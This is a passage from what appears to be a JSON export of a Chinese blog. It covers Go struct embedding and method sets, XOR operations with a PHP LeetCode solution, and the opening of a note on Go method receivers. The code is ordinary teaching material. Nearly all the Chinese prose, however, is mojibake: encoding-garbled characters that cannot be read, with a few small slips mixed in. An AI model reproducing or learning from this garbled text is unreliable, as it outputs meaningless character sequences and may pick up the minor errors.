string&#125;// éœ€è¦æ³¨æ„ ğŸš§ï¼Œå¦‚æœå®šä¹‰æˆè¿™æ ·ï¼Œå°±ä¸æ˜¯åµŒå…¥å­—æ®µäº†ï¼Œå› æ­¤ä¸ä¼šç»§æ‰¿æ¥å£çš„æ–¹æ³•é›†åˆï¼Œä¹Ÿå°±ä¸èƒ½ç›´æ¥è°ƒç”¨ S1.M1() äº†/*type S1 struct &#123; T1 T1 t2 *t2 I I a int b string&#125;*/ ä¸Šé¢çš„ç¤ºä¾‹ä»£ç æ˜¯ä¸€ä¸ªå¸¦æœ‰åµŒå…¥å­—æ®µï¼ˆEmbedded Fieldï¼‰çš„ç»“æ„ä½“å®šä¹‰ã€‚ å¯ä»¥çœ‹åˆ°ï¼Œç»“æ„ä½“ S1 å®šä¹‰ä¸­æœ‰ä¸‰ä¸ªâ€œéå¸¸è§„å½¢å¼â€ çš„æ ‡è¯†ç¬¦ï¼Œåˆ†åˆ«æ˜¯ T1ã€*t2ã€å’Œ Iï¼Œåƒè¿™ç§â€œéå¸¸è§„å½¢å¼â€ çš„æ ‡è¯†ç¬¦æ—¢ä»£è¡¨å­—æ®µçš„åå­—ï¼Œä¹Ÿä»£è¡¨å­—æ®µçš„ç±»å‹ï¼š T1ï¼šå­—æ®µåä¸º T1ï¼Œç±»å‹ä¸ºè‡ªå®šä¹‰ç±»å‹ T1 *t2ï¼šå­—æ®µåä¸º t2ï¼Œç±»å‹ä¸ºè‡ªå®šä¹‰ç»“æ„ä½“ç±»å‹ t2 çš„æŒ‡é’ˆç±»å‹ Iï¼šå­—æ®µåä¸º Iï¼Œç±»å‹ä¸ºæ¥å£ç±»å‹ I è¿™ç§ä»¥æŸä¸ªç±»å‹åã€ç±»å‹çš„æŒ‡é’ˆç±»å‹åæˆ–æ¥å£ç±»å‹åï¼Œç›´æ¥ä½œä¸ºç»“æ„ä½“å­—æ®µçš„æ–¹å¼å°±å«åšç»“æ„ä½“çš„ç±»å‹åµŒå…¥ï¼Œè¿™äº›å­—æ®µä¹Ÿè¢«å«åšåµŒå…¥å­—æ®µï¼ˆEmbedded Fieldï¼‰ã€‚ â€œç»§æ‰¿â€åŸç†åµŒå…¥å­—æ®µå…·ä½“æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿå®ƒè·Ÿæ™®é€šç»“æ„ä½“å­—æ®µåˆæœ‰ä»€ä¹ˆä¸åŒï¼Ÿä¸‹é¢ç»“åˆä¸€æ®µç¤ºä¾‹ä»£ç æ¥å…·ä½“è¯´æ˜ï¼š 123456789101112131415161718192021222324252627282930313233type MyInt intfunc (n *MyInt) Add(m int) &#123; *n = *n + MyInt(m)&#125;type t struct &#123; a int b int&#125;type S struct &#123; *MyInt t io.Reader s string n int&#125;func main() &#123; m := MyInt(17) r := strings.NewReader(\"hello, go\") s := S&#123; MyInt: &amp;m, t: t&#123; a: 1, b: 2, &#125;, Reader: r, s: \"demo\", &#125; var sl = make([]byte, len(\"hello, go\")) s.Reader.Read(sl) fmt.Println(string(sl)) // hello, go s.MyInt.Add(5) fmt.Println(*(s.MyInt)) // 22&#125; åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œç»“æ„ä½“ç±»å‹ S ä½¿ç”¨äº†ç±»å‹åµŒå…¥æ–¹å¼è¿›è¡Œå®šä¹‰ï¼ŒåµŒå…¥äº†ä¸‰ä¸ªå­—æ®µMyintã€tã€ä»¥åŠ Readerã€‚ ç¬¬ä¸‰ä¸ªåµŒå…¥å­—æ®µçš„åå­—ä¸º Reader è€Œä¸æ˜¯ io.Reader çš„åŸå› æ˜¯ï¼ŒGo è¯­è¨€è§„å®šå¦‚æœç»“æ„ä½“ä½¿ç”¨ä»å…¶ä»–åŒ…å¯¼å…¥çš„ç±»å‹ä½œä¸ºåµŒå…¥å­—æ®µï¼Œæ¯”å¦‚ pkg.Tï¼Œé‚£ä¹ˆè¿™ä¸ªåµŒå…¥å­—æ®µçš„å­—æ®µåå°±æ˜¯ Tï¼Œä»£è¡¨çš„ç±»å‹ä¸º pkg.Tã€‚ è¿è¡Œä¸Šé¢çš„ç¤ºä¾‹ä»£ç ï¼Œè¾“å‡ºå¦‚ä¸‹ï¼š 12hello, go22 è¿™æ ·çœ‹èµ·æ¥ï¼Œä½¿ç”¨åµŒå…¥å­—æ®µå’Œæ™®é€šå­—æ®µä¼¼ä¹å¹¶æ²¡æœ‰ä»€ä¹ˆå·®åˆ«ï¼Œè¾“å‡ºéƒ½æ˜¯ä¸€æ ·çš„ã€‚ å°† main å‡½æ•°ä¸­ï¼Œéƒ¨åˆ†ä»£ç æ›¿æ¢æˆä¸‹é¢è¿™éƒ¨åˆ†ï¼š 12345var sl = make([]byte, len(\"hello, go\"))s.Read(sl) fmt.Println(string(sl))s.Add(5) fmt.Println(*(s.MyInt)) è¿™é‡Œå¯èƒ½ä¼šæœ‰ç–‘é—®ï¼Œç±»å‹ S åˆæ²¡æœ‰å®šä¹‰ Read æ–¹æ³•å’Œ Add æ–¹æ³•ï¼Œè¿™æ ·å†™ä¸ä¼šç¼–è¯‘å¤±è´¥å—ï¼Ÿ å†æ¬¡è¿è¡Œç¤ºä¾‹ä»£ç ï¼Œä¼šå‘ç°ä¸ä½†æ²¡æœ‰ç¼–è¯‘å¤±è´¥ï¼Œç¨‹åºè¿˜æ­£å¸¸è¾“å‡ºäº†ã€‚ ä¹‹æ‰€ä»¥æ²¡æœ‰ç¼–è¯‘å¤±è´¥ï¼Œæ˜¯å› ä¸ºè¿™ä¸¤ä¸ªæ–¹æ³•å°±æ˜¯æ¥è‡ªäºç»“æ„ä½“ç±»å‹ S çš„ä¸¤ä¸ªåµŒå…¥å­—æ®µ Reader å’Œ MyIntã€‚ç»“æ„ä½“ç±»å‹ Sâ€œç»§æ‰¿â€äº† Reader å­—æ®µçš„æ–¹æ³• Read çš„å®ç°ï¼Œä¹Ÿâ€œç»§æ‰¿â€äº† *MyInt çš„ Add æ–¹æ³•çš„å®ç°ã€‚ è¿™é‡Œçš„â€ç»§æ‰¿â€œæ‰“äº†å¼•å·ï¼Œå¹¶ä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„ç»§æ‰¿ï¼Œåªæ˜¯ä½¿ç”¨äº†è¿™ä¸€è¯­ä¹‰ã€‚ å…¶åŸç†æ˜¯é€šè¿‡ç»“æ„ä½“ç±»å‹ S çš„å®ä¾‹ s è°ƒç”¨ Read æ–¹æ³•æ—¶ï¼ŒGo å‘ç°ç»“æ„ä½“ç±»å‹ S è‡ªèº«å¹¶æ²¡æœ‰å®šä¹‰ Read æ–¹æ³•ï¼Œäºæ˜¯ Go ä¼šæŸ¥çœ‹ S çš„åµŒå…¥å­—æ®µå¯¹åº”çš„ç±»å‹æ˜¯å¦å®šä¹‰äº† Read æ–¹æ³•ã€‚è¿™ä¸ªæ—¶å€™ï¼ŒReader å­—æ®µå°±è¢«æ‰¾äº†å‡ºæ¥ï¼Œä¹‹å s.Read çš„è°ƒç”¨å°±è¢«è½¬æ¢ä¸º s.Reader.Read è°ƒç”¨ã€‚ è¿™ç§å°†è°ƒç”¨â€œå§”æ´¾â€ç»™è¯¥ç»“æ„ä½“å†…éƒ¨åµŒå…¥ç±»å‹çš„å®ä¾‹å»æ‰§è¡Œï¼Œå«åšå§”æ´¾æ¨¡å¼ã€‚ å½“å¤–ç•Œè°ƒç”¨æ–°ç±»å‹çš„æ–¹æ³•æ—¶ï¼ŒGo ç¼–è¯‘å™¨ä¼šé¦–å…ˆæŸ¥æ‰¾æ–°ç±»å‹æ˜¯å¦å®ç°äº†è¿™ä¸ªæ–¹æ³•ï¼Œå¦‚æœæ²¡æœ‰ï¼Œå°±ä¼šå°†è°ƒç”¨å§”æ´¾ç»™å…¶å†…éƒ¨å®ç°äº†è¿™ä¸ªæ–¹æ³•çš„åµŒå…¥ç±»å‹çš„å®ä¾‹å»æ‰§è¡Œ Add æ–¹æ³•çš„è°ƒç”¨åŸç†åŒä¸Šã€‚ å› æ­¤ï¼Œç°åœ¨å°±æ¸…æ¥šäº†åµŒå…¥å­—æ®µçš„ä½œç”¨ï¼Œå®ƒå¯ä»¥ç”¨æ¥å®ç°æ–¹æ³•çš„â€œç»§æ‰¿â€ã€‚ ç±»å‹åµŒå…¥ä¸æ–¹æ³•é›†åˆåœ¨å‰é¢è®²è§£æ¥å£ç±»å‹çš„ç±»å‹åµŒå…¥æ—¶ï¼Œæˆ‘ä»¬æåˆ°è¿‡æ¥å£ç±»å‹çš„ç±»å‹åµŒå…¥çš„æœ¬è´¨ï¼Œå°±æ˜¯åµŒå…¥ç±»å‹çš„æ–¹æ³•é›†åˆå¹¶å…¥åˆ°æ–°æ¥å£ç±»å‹çš„æ–¹æ³•é›†åˆä¸­ï¼Œå¹¶ä¸”ï¼Œæ¥å£ç±»å‹åªèƒ½åµŒå…¥æ¥å£ç±»å‹ã€‚è€Œç»“æ„ä½“ç±»å‹å¯¹åµŒå…¥ç±»å‹çš„è¦æ±‚å°±æ¯”è¾ƒå®½æ³›äº†ï¼Œå¯ä»¥æ˜¯ä»»æ„è‡ªå®šä¹‰ç±»å‹æˆ–æ¥å£ç±»å‹ã€‚ ä¸‹é¢å°±åˆ†åˆ«æ¥çœ‹çœ‹ï¼Œåœ¨è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼Œç»“æ„ä½“ç±»å‹çš„æ–¹æ³•é›†åˆä¼šæœ‰æ€æ ·çš„å˜åŒ–ã€‚è¿™é‡Œå€ŸåŠ©å‰é¢ç¬”è®°ä¸­çš„ dumpMethodSet å·¥å…·å‡½æ•°æ¥è¾“å‡ºå„ä¸ªç±»å‹çš„æ–¹æ³•é›†åˆã€‚ ç»“æ„ä½“ç±»å‹ä¸­åµŒå…¥æ¥å£ç±»å‹1234567891011121314type I interface &#123; M1() M2()&#125;type T struct &#123; I&#125;func (T) M3() &#123;&#125;func main() &#123; var t T var p *T dumpMethodSet(t) dumpMethodSet(p)&#125; è¿è¡Œä¸Šé¢çš„ç¤ºä¾‹ä»£ç ï¼Œè¾“å‡ºå¦‚ä¸‹ï¼š 12345678main.T&#39;s method set:- M1- M2- M3*main.T&#39;s method set:- M1- M2- M3 å¯ä»¥çœ‹åˆ°ï¼ŒåŸæœ¬ç»“æ„ä½“ç±»å‹ T åªå¸¦æœ‰ä¸€ä¸ªæ–¹æ³• M3ï¼Œä½†åœ¨åµŒå…¥æ¥å£ç±»å‹ I åï¼Œç»“æ„ä½“ç±»å‹ T çš„æ–¹æ³•é›†åˆä¸­åˆå¹¶å…¥äº†æ¥å£ç±»å‹ I çš„æ–¹æ³•é›†åˆã€‚ æ‰€ä»¥ï¼Œç»“è®ºå°±æ˜¯ï¼šç»“æ„ä½“ç±»å‹çš„æ–¹æ³•é›†åˆï¼ŒåŒ…å«åµŒå…¥çš„æ¥å£ç±»å‹çš„æ–¹æ³•é›†åˆã€‚ ä¸è¿‡è¿™é‡Œéœ€è¦æ³¨æ„ï¼šå’Œå‰é¢æ¥å£ç±»å‹ä¸­åµŒå…¥æ¥å£ç±»å‹ï¼Œä¸åŒçš„æ˜¯ï¼Œç»“æ„ä½“ç±»å‹åµŒå…¥æ¥å£ç±»å‹ä¸å…è®¸æ–¹æ³•é›†åˆå­˜åœ¨äº¤é›†ã€‚ 12345678910111213141516171819type E1 interface &#123; M1() M2() M3()&#125;type E2 interface &#123; M1() M2() M4()&#125;type T struct &#123; E1 E2&#125;func main() &#123; t := T&#123;&#125; t.M1() t.M2()&#125; è¿è¡Œä¸Šé¢çš„ç¤ºä¾‹ä»£ç ï¼Œä¼šå‘ç°ç¼–è¯‘å¤±è´¥ï¼š 12main.go:22:3: ambiguous selector t.M1main.go:23:3: ambiguous selector t.M2 è¿™æ˜¯å› ä¸ºä¸¤ä¸ªæ¥å£ç±»å‹ä¸­éƒ½å­˜åœ¨ M1 ä¸ M2 æ–¹æ³•ï¼Œåœ¨ç»“æ„ä½“æ²¡æœ‰å®ç°è¿™ä¸¤ä¸ªæ–¹æ³•çš„æƒ…å†µä¸‹ï¼Œç¼–è¯‘å™¨æ— æ³•è‡ªå·±åšå‡ºé€‰æ‹©ã€‚ è§£å†³æ–¹æ¡ˆä¹Ÿå¾ˆç®€å•ï¼š æ¶ˆé™¤æ¥å£ç±»å‹ä¸­é‡å¤å®šä¹‰çš„æ–¹æ³• ä¸ºç»“æ„ä½“å¢åŠ  M1ã€M2 æ–¹æ³•çš„å®ç° ç»“æ„ä½“ç±»å‹ä¸­åµŒå…¥ç»“æ„ä½“ç±»å‹å‰é¢å·²ç»äº†è§£äº†ï¼Œåœ¨ç»“æ„ä½“ç±»å‹ä¸­åµŒå…¥ç»“æ„ä½“ç±»å‹ï¼Œå¯ä»¥ä½œä¸ºå®ç°â€ç»§æ‰¿â€œçš„æ‰‹æ®µã€‚ å¤–éƒ¨çš„ç»“æ„ä½“ç±»å‹ T å¯ä»¥â€œç»§æ‰¿â€åµŒå…¥çš„ç»“æ„ä½“ç±»å‹çš„æ‰€æœ‰æ–¹æ³•çš„å®ç°ã€‚å¹¶ä¸”ï¼Œæ— è®ºæ˜¯ T ç±»å‹çš„å˜é‡å®ä¾‹è¿˜æ˜¯ *T ç±»å‹å˜é‡å®ä¾‹ï¼Œéƒ½å¯ä»¥è°ƒç”¨æ‰€æœ‰â€œç»§æ‰¿â€çš„æ–¹æ³•ã€‚ ä½†è¿™ç§æƒ…å†µä¸‹ï¼Œå¸¦æœ‰åµŒå…¥ç±»å‹çš„æ–°ç±»å‹ç©¶ç«Ÿâ€œç»§æ‰¿â€äº†å“ªäº›æ–¹æ³•ï¼Œé€šè¿‡ä¸‹é¢çš„ç¤ºä¾‹æ¥çœ‹ä¸€ä¸‹ï¼š 12345678910111213141516171819202122type T1 struct&#123;&#125;func (T1) T1M1() &#123; println(\"T1's M1\") &#125;func (*T1) PT1M2() &#123; println(\"PT1's M2\") &#125;type T2 struct&#123;&#125;func (T2) T2M1() &#123; println(\"T2's M1\") &#125;func (*T2) PT2M2() &#123; println(\"PT2's M2\") &#125;type T struct &#123; T1 *T2&#125;func main() &#123; t := T&#123; T1: T1&#123;&#125;, T2: &amp;T2&#123;&#125;, &#125; dumpMethodSet(t) dumpMethodSet(&amp;t)&#125; ä¸Šé¢çš„ç¤ºä¾‹ä»£ç ä¸­ï¼Œå„å®ä¾‹çš„æ–¹æ³•é›†åˆæ˜¯ä¸åŒçš„ï¼š T1 çš„æ–¹æ³•é›†åˆåŒ…å«ï¼šT1M1 *T1 çš„æ–¹æ³•é›†åˆåŒ…å«ï¼šT1M1ã€PT1M2 T2 çš„æ–¹æ³•é›†åˆåŒ…å«ï¼šT2M1 *T2 çš„æ–¹æ³•é›†åˆåŒ…å«ï¼šT2M1ã€PT2M2 è¿è¡Œç¤ºä¾‹ä»£ç ï¼Œè¾“å‡ºå¦‚ä¸‹ï¼š 123456789main.T's method set:- PT2M2- T1M1- T2M1*main.T's method set:- PT1M2- PT2M2- T1M1- T2M1 é€šè¿‡è¾“å‡ºç»“æœï¼Œæˆ‘ä»¬çœ‹åˆ°äº† T å’Œ *T ç±»å‹çš„æ–¹æ³•é›†åˆæœç„¶æœ‰å·®åˆ«çš„ï¼š ç±»å‹ T çš„æ–¹æ³•é›†åˆ = T1 çš„æ–¹æ³•é›†åˆ + *T2 çš„æ–¹æ³•é›†åˆ ç±»å‹ *T çš„æ–¹æ³•é›†åˆ = *T1 çš„æ–¹æ³•é›†åˆ + *T2 çš„æ–¹æ³•é›†åˆ è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ*T ç±»å‹çš„æ–¹æ³•é›†åˆï¼Œå®ƒåŒ…å«çš„å¯ä¸æ˜¯ T1 ç±»å‹çš„æ–¹æ³•é›†åˆï¼Œè€Œæ˜¯ *T1 ç±»å‹çš„æ–¹æ³•é›†åˆï¼Œè€Œ *T1 æ–¹æ³•é›†åˆåˆåŒ…å« T1M1ã€PT1M2ï¼Œï¼ˆT2åŒç†ï¼‰ï¼Œæ‰€ä»¥*T ç±»å‹çš„æ–¹æ³•é›†åˆåŒ…å«äº†PT1M2ã€PT2M2ã€T1M1ã€T2M2ã€‚ æ€»ç»“ æ¥å£ç±»å‹åµŒå…¥å°±æ˜¯åœ¨ä¸€ä¸ªæ¥å£ç±»å‹ä¸­ï¼ŒåµŒå…¥å¦å¤–ä¸€ä¸ªæ¥å£ç±»å‹ï¼Œå…è®¸æ–¹æ³•é›†åˆå¹¶å…¥ ç»“æ„ä½“ç±»å‹åµŒå…¥å°±æ˜¯ä»¥æŸä¸ªç±»å‹åã€ç±»å‹çš„æŒ‡é’ˆç±»å‹åæˆ–æ¥å£ç±»å‹åï¼Œç›´æ¥ä½œä¸ºç»“æ„ä½“å­—æ®µ æ¥å£ç±»å‹åªèƒ½åµŒå…¥æ¥å£ç±»å‹ï¼Œç»“æ„ä½“ç±»å‹å¯ä»¥åµŒå…¥ä»»æ„è‡ªå®šä¹‰ç±»å‹æˆ–æ¥å£ç±»å‹ åœ¨ Go è¯­è¨€ä¸­å¯ä»¥å€ŸåŠ©ç»“æ„ä½“ç±»å‹åµŒå…¥å®ç°â€œç»§æ‰¿â€ ç»“æ„ä½“ç±»å‹ä¸­åµŒå…¥æ¥å£ç±»å‹æ—¶ï¼ŒåŒ…å«åµŒå…¥çš„æ¥å£ç±»å‹çš„æ–¹æ³•é›†åˆï¼ˆä½†æ˜¯æ¥å£ç±»å‹çš„æ–¹æ³•é›†åˆä¸èƒ½å­˜åœ¨äº¤é›†ï¼‰ ç»“æ„ä½“ç±»å‹ä¸­åµŒå…¥ç»“æ„ä½“ç±»å‹æ—¶ï¼ŒT å’Œ *T çš„æ–¹æ³•é›†åˆä¸ä¸€æ · æ— è®ºåŸç±»å‹æ˜¯æ¥å£ç±»å‹è¿˜æ˜¯éæ¥å£ç±»å‹ï¼Œç±»å‹åˆ«åéƒ½ä¸åŸç±»å‹æ‹¥æœ‰å®Œå…¨ç›¸åŒçš„æ–¹æ³•é›†åˆ å‚è€ƒé“¾æ¥ Tony Bai Â· Go è¯­è¨€ç¬¬ä¸€è¯¾","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"å¼‚æˆ–è¿ç®— XOR å¿«é€Ÿä¸Šæ‰‹","slug":"different-calculations-xor-rapid-skill","date":"2022-10-31T15:31:38.000Z","updated":"2023-02-18T03:28:33.579Z","comments":true,"path":"different-calculations-xor-rapid-skill/","link":"","permalink":"https://www.0x2beace.com/different-calculations-xor-rapid-skill/","excerpt":"è¿ç®—ç¬¦æœ‰å¤šç§ç±»å‹ï¼Œå¸¸è§çš„æœ‰ï¼š ç®—æœ¯è¿ç®—ç¬¦ å…³ç³»è¿ç®—ç¬¦ é€»è¾‘è¿ç®—ç¬¦ ä½è¿ç®— â€¦ åœ¨ä½è¿ç®—ä¸­ï¼Œå¼‚æˆ–è¿ç®—è™½ç„¶ä¸å¸¸ç”¨ï¼Œä½†æ˜¯ä¹Ÿéå¸¸é‡è¦ï¼ŒæŸäº›åœºæ™¯ä¸‹ï¼Œä½¿ç”¨å¼‚æˆ–è¿ç®—éå¸¸æ–¹ä¾¿ã€‚","text":"è¿ç®—ç¬¦æœ‰å¤šç§ç±»å‹ï¼Œå¸¸è§çš„æœ‰ï¼š ç®—æœ¯è¿ç®—ç¬¦ å…³ç³»è¿ç®—ç¬¦ é€»è¾‘è¿ç®—ç¬¦ ä½è¿ç®— â€¦ åœ¨ä½è¿ç®—ä¸­ï¼Œå¼‚æˆ–è¿ç®—è™½ç„¶ä¸å¸¸ç”¨ï¼Œä½†æ˜¯ä¹Ÿéå¸¸é‡è¦ï¼ŒæŸäº›åœºæ™¯ä¸‹ï¼Œä½¿ç”¨å¼‚æˆ–è¿ç®—éå¸¸æ–¹ä¾¿ã€‚ æ¦‚å¿µä½è¿ç®—ç¬¦ä½œç”¨äºä½ï¼Œå¹¶é€ä½æ‰§è¡Œæ“ä½œã€‚&amp;ã€ | å’Œ ^ çš„çœŸå€¼è¡¨å¦‚ä¸‹æ‰€ç¤ºï¼š p q p &amp; qï¼ˆä¸è¿ç®—ï¼‰ p | qï¼ˆæˆ–è¿ç®—ï¼‰ p ^ qï¼ˆå¼‚æˆ–è¿ç®—ï¼‰ 0 0 0 0 0 0 1 0 1 1 1 1 1 1 0 1 0 0 1 1 ä¸è¿ç®—ï¼ˆANDï¼‰ å’Œ æˆ–è¿ç®—ï¼ˆORï¼‰ éƒ½æ¯”è¾ƒå¥½ç†è§£ï¼Œæ‰€ä»¥è¿™ç¯‡ç¬”è®°é‡ç‚¹ä»‹ç» å¼‚æˆ–è¿ç®—ï¼ˆXORï¼‰ã€‚ å¼‚æˆ–ï¼Œè‹±æ–‡ä¸º exclusive ORï¼Œç¼©å†™æˆxorï¼ŒXOR ä¸»è¦ç”¨æ¥åˆ¤æ–­ä¸¤ä¸ªå€¼æ˜¯å¦ä¸åŒã€‚ è¿ç®—æ³•åˆ™å½’é›¶å¾‹ï¼Œä¸€ä¸ªå€¼ä¸è‡ªèº«çš„è¿ç®—ï¼Œæ€»æ˜¯ä¸º 0ï¼š 1x ^ x &#x3D; 0 æ’ç­‰å¾‹ï¼Œä¸€ä¸ªå€¼ä¸ 0 çš„è¿ç®—ï¼Œæ€»æ˜¯ç­‰äºå…¶æœ¬èº«ï¼š 1x ^ 0 &#x3D; x äº¤æ¢å¾‹ï¼š 1x ^ y &#x3D; y ^ x ç»“åˆå¾‹ï¼š 1x ^ y ^ z &#x3D; x ^ (y ^ z) &#x3D; (x ^ y) ^ z è‡ªåï¼š 1x ^ y ^ x &#x3D; y åº”ç”¨æ ¹æ®ä¸Šé¢çš„è¿™äº›è¿ç®—æ³•åˆ™ï¼Œå¯ä»¥å¾—åˆ°å¼‚æˆ–è¿ç®—çš„å¾ˆå¤šé‡è¦åº”ç”¨ã€‚ ç®€åŒ–è®¡ç®—å¤šä¸ªå€¼çš„å¼‚æˆ–è¿ç®—ï¼Œå¯ä»¥æ ¹æ®è¿ç®—å®šå¾‹è¿›è¡Œç®€åŒ–ã€‚ 1234x ^ y ^ z ^ y ^ x&#x3D; x ^ x ^ y ^ y ^ z&#x3D; 0 ^ 0 ^ z&#x3D; z äº¤æ¢å€¼ä¸¤ä¸ªå˜é‡è¿ç»­è¿›è¡Œä¸‰æ¬¡å¼‚æˆ–è¿ç®—ï¼Œå¯ä»¥äº’ç›¸äº¤æ¢å€¼ã€‚ å‡è®¾ä¸¤ä¸ªå˜é‡æ˜¯xå’Œyï¼Œå„è‡ªçš„å€¼æ˜¯aå’Œbã€‚ä¸‹é¢å°±æ˜¯xå’Œyè¿›è¡Œä¸‰æ¬¡å¼‚æˆ–è¿ç®—ï¼š 12345x = x ^ y; // ç¬¬ä¸€æ¬¡è¿ç®—ä¹‹åï¼Œx çš„å€¼æ˜¯ a ^ bï¼Œy çš„å€¼æ˜¯ by = x ^ y // ç¬¬äºŒæ¬¡è¿ç®—ä¹‹åï¼Œx çš„å€¼æ˜¯ a ^ bï¼Œy çš„å€¼æ˜¯ a ^ b ^ bï¼Œä¹Ÿå°±æ˜¯ ax = x ^ y // ç¬¬ä¸‰æ¬¡è¿ç®—ä¹‹åï¼Œx çš„å€¼æ˜¯ a ^ b ^ aï¼Œy çš„å€¼æ˜¯ a// æ‰€ä»¥æœ€ç»ˆ x çš„å€¼æ˜¯ bï¼Œ y çš„å€¼æ˜¯ a åŠ å¯†å¼‚æˆ–è¿ç®—å¯ä»¥ç”¨äºåŠ å¯†ã€‚ ç¬¬ä¸€æ­¥ï¼Œæ˜æ–‡ï¼ˆtextï¼‰ä¸å¯†é’¥ï¼ˆkeyï¼‰è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå¯ä»¥å¾—åˆ°å¯†æ–‡ï¼ˆcipherTextï¼‰ã€‚ 1text ^ key &#x3D; cipherText ç¬¬äºŒæ­¥ï¼Œå¯†æ–‡ä¸å¯†é’¥å†æ¬¡è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå°±å¯ä»¥è¿˜åŸæˆæ˜æ–‡ã€‚ 1cipherText ^ key &#x3D; text åŸç†å¾ˆç®€å•ï¼Œå¦‚æœæ˜æ–‡æ˜¯ xï¼Œå¯†é’¥æ˜¯ yï¼Œé‚£ä¹ˆ x è¿ç»­ä¸ y è¿›è¡Œä¸¤æ¬¡å¼‚æˆ–è¿ç®—ï¼Œå¾—åˆ°è‡ªèº«ã€‚ 1234(x ^ y) ^ y&#x3D; x ^ (y ^ y)&#x3D; x ^ 0&#x3D; x æ•°æ®å¤‡ä»½å¼‚æˆ–è¿ç®—å¯ä»¥ç”¨äºæ•°æ®å¤‡ä»½ã€‚ æ–‡ä»¶ x å’Œæ–‡ä»¶ y è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œäº§ç”Ÿä¸€ä¸ªå¤‡ä»½æ–‡ä»¶ zã€‚ 1x ^ y &#x3D; z ä»¥åï¼Œæ— è®ºæ˜¯æ–‡ä»¶ x æˆ–æ–‡ä»¶ y æŸåï¼Œåªè¦ä¸æ˜¯ä¸¤ä¸ªåŸå§‹æ–‡ä»¶åŒæ—¶æŸåï¼Œå°±èƒ½æ ¹æ®å¦ä¸€ä¸ªæ–‡ä»¶å’Œå¤‡ä»½æ–‡ä»¶ï¼Œè¿›è¡Œè¿˜åŸã€‚ 12345x ^ z&#x3D; x ^ (x ^ y) &#x3D; (x ^ x) ^ y&#x3D; 0 ^ y&#x3D; y ä¸Šé¢çš„ä¾‹å­æ˜¯ y æŸåï¼Œx å’Œ z è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå°±èƒ½å¾—åˆ° yã€‚ ä¸€é“ç®—æ³•é¢˜åªå‡ºç°ä¸€æ¬¡çš„æ•°å­—â€”â€”LeetCode ç»™å®šä¸€ä¸ªéç©ºæ•´æ•°æ•°ç»„ï¼Œé™¤äº†æŸä¸ªå…ƒç´ åªå‡ºç°ä¸€æ¬¡ä»¥å¤–ï¼Œå…¶ä½™æ¯ä¸ªå…ƒç´ å‡å‡ºç°ä¸¤æ¬¡ã€‚æ‰¾å‡ºé‚£ä¸ªåªå‡ºç°äº†ä¸€æ¬¡çš„å…ƒç´ ã€‚ è¦æ±‚ï¼šç®—æ³•çš„å¤æ‚åº¦æ˜¯çº¿æ€§çš„ï¼Œä¸”ä¸å…è®¸ä½¿ç”¨é¢å¤–çš„ç©ºé—´ã€‚ ç¤ºä¾‹ï¼š 12è¾“å…¥: [4,1,2,1,2]è¾“å‡º: 4 è§£é¢˜æ€è·¯ï¼šè¿™é‡Œå°±å¯ä»¥åˆ©ç”¨å¼‚æˆ–è¿ç®—çš„è‡ªåç‰¹æ€§ï¼Œå¯ä»¥å°†æ‰€æœ‰ç›¸åŒçš„æ•°å­—å…¨éƒ¨æŠµæ¶ˆæ‰ï¼Œæœ€åç•™ä¸‹çš„å°±æ˜¯åªå‡ºç°äº†ä¸€æ¬¡çš„å…ƒç´ ï¼š 12345678910111213function func($array)&#123; $result = 0; for ($i = 0; $i &lt; count($array); $i++) &#123; $result ^= $array[$i]; &#125; return $result;&#125;$array = [4, 1, 2, 1, 4];$result = func($array);print_r($result); // 0 ^ 4 ^ 1 ^ 2 ^ 1 ^ 4 = 2 å‚è€ƒé“¾æ¥ å¼‚æˆ–è¿ç®— XOR æ•™ç¨‹","categories":[{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://www.0x2beace.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://www.0x2beace.com/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"Go è¯­è¨€å­¦ä¹ ç¬”è®°â€”â€”æ–¹æ³•æ¥æ”¶å™¨çš„é€‰æ‹©","slug":"go-language-study-notes-receiver","date":"2022-10-31T14:34:23.000Z","updated":"2023-02-18T03:28:33.592Z","comments":true,"path":"go-language-study-notes-receiver/","link":"","permalink":"https://www.0x2beace.com/go-language-study-notes-receiver/","excerpt":"ä¸Šä¸€ç¯‡ç¬”è®°äº†è§£äº† Go è¯­è¨€æ–¹æ³•çš„å£°æ˜ã€æœ¬è´¨ï¼Œè¿™ç¯‡ç¬”è®°ä¸»è¦æ¥äº†è§£ Go è¯­è¨€æ–¹æ³•çš„receiver å‚æ•°ã€‚","text":"ä¸Šä¸€ç¯‡ç¬”è®°äº†è§£äº† Go è¯­è¨€æ–¹æ³•çš„å£°æ˜ã€æœ¬è´¨ï¼Œè¿™ç¯‡ç¬”è®°ä¸»è¦æ¥äº†è§£ Go è¯­è¨€æ–¹æ³•çš„receiver å‚æ•°ã€‚ receiver å‚æ•°ç±»å‹å¯¹ Go æ–¹æ³•çš„å½±å“è¦æƒ³ä¸º receiver å‚æ•°é€‰å‡ºåˆç†çš„ç±»å‹ï¼Œéœ€è¦å…ˆè¦äº†è§£ä¸åŒçš„ receiver å‚æ•°ç±»å‹ä¼šå¯¹ Go æ–¹æ³•äº§ç”Ÿæ€æ ·çš„å½±å“ã€‚ å› ä¸ºæ–¹æ³•çš„æœ¬è´¨å°±æ˜¯å‡½æ•°ï¼Œæ‰€ä»¥ä¸‹é¢ä»ç­‰ä»·è½¬æ¢ä¹‹åçš„å‡½æ•°çš„è§’åº¦æ¥åˆ†æä¸€ä¸‹å¯¹å‡½æ•°æœ‰ä»€ä¹ˆå½±å“ï¼Œé—´æ¥å¾—å‡ºå®ƒå¯¹ Go æ–¹æ³•çš„å½±å“å‘¢ã€‚ è¿˜æ˜¯ä»ä¸€æ®µç¤ºä¾‹ä»£ç 